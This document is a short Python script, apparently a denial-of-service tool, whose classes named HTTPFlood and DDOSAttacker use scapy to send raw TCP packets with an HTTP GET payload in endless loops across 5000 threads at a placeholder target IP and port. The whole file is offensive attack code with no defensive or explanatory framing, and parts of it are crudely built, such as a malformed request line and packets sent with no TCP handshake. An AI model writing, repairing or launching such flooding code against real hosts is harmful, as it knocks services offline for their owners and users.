import socket
import threading
from scapy.all import *


class HTTPFlood:
    def __init__(self, target, dst_port):
        self.target = target
        self.dst_port = dst_port

    def flood(self):
        payload = f"GET /http://{self.target} HTTP/1.1\nHost: {socket.gethostbyname(socket.gethostname())}\n\n"
        pkt = IP(dst=self.target) / TCP(dport=int(self.dst_port)) / Raw(payload)

        while True:
            send(pkt, inter=0.001)


class DDOSAttacker:
    def __init__(self, target, port):
        self.target = target
        self.port = port

    def validate_port(self, port):
        if not 0 < int(port) <= 65535:
            print("Port number must be between 1 and 65535")
            sys.exit(1)

    def launch_attack(self):
        self.validate_port(self.port)
        num_threads = 5000
        threads = []

        for _ in range(num_threads):
            flood_instance = HTTPFlood(self.target, self.port)
            thread = threading.Thread(target=flood_instance.flood)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()


def main():
    target = "target_ip"
    port = "target_port"
    attacker = DDOSAttacker(target, port)
    attacker.launch_attack()


if __name__ == "__main__":
    main()
